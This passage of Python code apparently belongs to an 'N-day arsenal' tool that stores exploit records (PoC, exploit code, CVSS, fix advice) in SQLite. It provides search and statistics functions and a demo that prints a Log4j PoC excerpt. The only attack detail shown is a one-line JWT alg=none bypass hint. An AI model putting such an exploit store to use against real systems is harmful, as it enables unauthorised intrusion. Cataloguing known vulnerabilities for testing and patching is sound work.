# 3. 重新签名（如果知道密钥）或使用alg=none绕过""",
                fix_suggestion="对所有接口进行身份验证；对每个接口进行权限校验（基于角色的访问控制RBAC）；使用随机不可预测的ID（UUID）；对用户ID和资源ID进行关联校验；JWT使用强密钥并验证签名；禁用alg=none；定期审计权限配置；部署API网关进行统一鉴权",
                references=["https://owasp.org/www-community/attacks/Broken_Access_Control"],
                cvss_score=8.1,
                tags=["未授权访问", "越权", "Web", "通用"],
                verified=True,
            ),
        ])

        return exploits

    def add_exploit(self, exploit: Exploit) -> bool:
        """添加漏洞利用"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute("""
                INSERT OR REPLACE INTO exploits VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            """, (
                exploit.cve_id, exploit.name, exploit.severity, exploit.vuln_type,
                exploit.description, json.dumps(exploit.affected_versions, ensure_ascii=False),
                exploit.exploit_conditions, exploit.poc, exploit.exp, exploit.fix_suggestion,
                json.dumps(exploit.references, ensure_ascii=False), exploit.cvss_score,
                exploit.cvss_vector, 1 if exploit.exploit_available else 0,
                1 if exploit.in_the_wild else 0, exploit.published_date,
                json.dumps(exploit.tags, ensure_ascii=False), exploit.author,
                1 if exploit.verified else 0, datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"添加漏洞利用失败: {e}")
            return False
        finally:
            conn.close()

    def get_exploit(self, cve_id: str) -> Optional[Dict]:
        """获取漏洞利用详情"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM exploits WHERE cve_id = ?", (cve_id,))
        row = cursor.fetchone()
        conn.close()

        if not row:
            return None

        data = dict(row)
        for field in ["affected_versions", "references", "tags"]:
            if data.get(field):
                try:
                    data[field] = json.loads(data[field])
                except:
                    data[field] = []
        data["exploit_available"] = bool(data.get("exploit_available", 0))
        data["in_the_wild"] = bool(data.get("in_the_wild", 0))
        data["verified"] = bool(data.get("verified", 0))
        return data

    def search(self, keyword: str = "", severity: str = "", vuln_type: str = "",
               cvss_min: float = 0.0, limit: int = 50, offset: int = 0) -> Tuple[List[Dict], int]:
        """搜索漏洞利用"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        query = "SELECT * FROM exploits WHERE 1=1"
        count_query = "SELECT COUNT(*) as total FROM exploits WHERE 1=1"
        params = []

        if keyword:
            query += " AND (cve_id LIKE ? OR name LIKE ? OR description LIKE ? OR tags LIKE ?)"
            count_query += " AND (cve_id LIKE ? OR name LIKE ? OR description LIKE ? OR tags LIKE ?)"
            kw = f"%{keyword}%"
            params.extend([kw, kw, kw, kw])

        if severity:
            query += " AND severity = ?"
            count_query += " AND severity = ?"
            params.append(severity)

        if vuln_type:
            query += " AND vuln_type = ?"
            count_query += " AND vuln_type = ?"
            params.append(vuln_type)

        if cvss_min > 0:
            query += " AND cvss_score >= ?"
            count_query += " AND cvss_score >= ?"
            params.append(cvss_min)

        query += " ORDER BY cvss_score DESC LIMIT ? OFFSET ?"
        params.extend([limit, offset])

        cursor.execute(query, params)
        rows = cursor.fetchall()

        cursor.execute(count_query, params[:-2] if len(params) > 2 else [])
        total = cursor.fetchone()["total"]

        conn.close()

        results = []
        for row in rows:
            data = dict(row)
            for field in ["affected_versions", "references", "tags"]:
                if data.get(field):
                    try:
                        data[field] = json.loads(data[field])
                    except:
                        data[field] = []
            data["exploit_available"] = bool(data.get("exploit_available", 0))
            data["in_the_wild"] = bool(data.get("in_the_wild", 0))
            data["verified"] = bool(data.get("verified", 0))
            # 移除大字段，只返回摘要
            data.pop("poc", None)
            data.pop("exp", None)
            data.pop("description", None)
            results.append(data)

        return results, total

    def count(self) -> int:
        """统计漏洞利用数量"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM exploits")
        count = cursor.fetchone()[0]
        conn.close()
        return count

    def get_statistics(self) -> Dict:
        """获取统计信息"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute("SELECT COUNT(*) FROM exploits")
        total = cursor.fetchone()[0]

        cursor.execute("SELECT severity, COUNT(*) FROM exploits GROUP BY severity")
        by_severity = dict(cursor.fetchall())

        cursor.execute("SELECT vuln_type, COUNT(*) FROM exploits GROUP BY vuln_type ORDER BY COUNT(*) DESC")
        by_type = dict(cursor.fetchall())

        cursor.execute("SELECT COUNT(*) FROM exploits WHERE in_the_wild = 1")
        in_the_wild = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM exploits WHERE verified = 1")
        verified = cursor.fetchone()[0]

        cursor.execute("SELECT AVG(cvss_score) FROM exploits")
        avg_cvss = cursor.fetchone()[0] or 0

        conn.close()

        return {
            "total": total,
            "by_severity": by_severity,
            "by_type": by_type,
            "in_the_wild": in_the_wild,
            "verified": verified,
            "avg_cvss": round(avg_cvss, 2),
            "critical": by_severity.get("critical", 0),
            "high": by_severity.get("high", 0),
            "medium": by_severity.get("medium", 0),
            "low": by_severity.get("low", 0),
        }

    def match_exploits(self, cve_ids: List[str]) -> List[Dict]:
        """根据CVE编号列表匹配漏洞利用"""
        results = []
        for cve_id in cve_ids:
            exploit = self.get_exploit(cve_id)
            if exploit:
                results.append(exploit)
        return results

    def get_high_risk_exploits(self, limit: int = 20) -> List[Dict]:
        """获取高危漏洞利用"""
        results, _ = self.search(severity="critical", cvss_min=9.0, limit=limit)
        return results

    def get_in_the_wild_exploits(self, limit: int = 20) -> List[Dict]:
        """获取在野利用漏洞"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM exploits WHERE in_the_wild = 1 ORDER BY cvss_score DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        conn.close()

        results = []
        for row in rows:
            data = dict(row)
            for field in ["affected_versions", "references", "tags"]:
                if data.get(field):
                    try:
                        data[field] = json.loads(data[field])
                    except:
                        data[field] = []
            data["exploit_available"] = bool(data.get("exploit_available", 0))
            data["in_the_wild"] = bool(data.get("in_the_wild", 0))
            data["verified"] = bool(data.get("verified", 0))
            results.append(data)
        return results


# 便捷函数
def create_nday_arsenal(db_path: str = "./data/nday_arsenal.db") -> NdayArsenal:
    """创建Nday武器库"""
    return NdayArsenal(db_path)


if __name__ == "__main__":
    print("=== Nday武器库 ===")
    print()

    arsenal = NdayArsenal()

    # 统计
    stats = arsenal.get_statistics()
    print(f"武器库统计:")
    print(f"  总数: {stats['total']}")
    print(f"  严重: {stats['critical']}")
    print(f"  高危: {stats['high']}")
    print(f"  中危: {stats['medium']}")
    print(f"  低危: {stats['low']}")
    print(f"  在野利用: {stats['in_the_wild']}")
    print(f"  已验证: {stats['verified']}")
    print(f"  平均CVSS: {stats['avg_cvss']}")
    print()

    # 按类型统计
    print("按类型统计:")
    for vtype, count in stats['by_type'].items():
        print(f"  {vtype}: {count}")
    print()

    # 搜索示例
    print("搜索Log4j相关漏洞:")
    results, total = arsenal.search(keyword="Log4j")
    for r in results:
        print(f"  {r['cve_id']}: {r['name']} (CVSS: {r['cvss_score']})")
    print()

    # 获取详情
    print("CVE-2021-44228详情:")
    exploit = arsenal.get_exploit("CVE-2021-44228")
    if exploit:
        print(f"  名称: {exploit['name']}")
        print(f"  严重程度: {exploit['severity']}")
        print(f"  CVSS: {exploit['cvss_score']}")
        print(f"  描述: {exploit['description'][:100]}...")
        print(f"  POC: {exploit['poc'][:100]}...")
        print(f"  修复建议: {exploit['fix_suggestion'][:100]}...")
